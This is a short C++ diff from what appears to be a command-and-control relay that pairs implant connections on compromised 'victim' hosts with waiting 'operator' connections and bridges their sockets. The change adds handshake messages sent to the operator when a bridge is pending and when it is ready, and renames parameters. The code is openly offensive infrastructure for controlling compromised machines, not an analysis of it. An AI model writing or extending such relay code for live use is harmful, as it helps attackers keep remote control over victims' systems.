@@ -75,6 +75,7 @@ private:
                 bridge_sockets(std::move(waiting_victims[port]), std::move(conn));
                 waiting_victims.erase(port);
             } else {
+                conn->sendline(session_handshake::bridge_waiting);
                 waiting_operators[port] = std::move(conn);
                 logger::info("Operator waiting for Victim on Port: {}", port);
             }
@@ -139,8 +140,10 @@ public:
     //--------------------------------
     //
     //--------------------------------
-    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& a_ptr, std::unique_ptr<cpppwn::Remote>&& b_ptr) {
-        std::thread([vic = std::move(a_ptr), op = std::move(b_ptr)]() -> void {
+    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& victim, std::unique_ptr<cpppwn::Remote>&& operator_conn) {
+        operator_conn->sendline(session_handshake::bridge_ready);
+
+        std::thread([vic = std::move(victim), op = std::move(operator_conn)]() -> void {
             logger::success("Bridging established between Implant and Operator.");
 
             while (vic->is_alive() && op->is_alive()) {
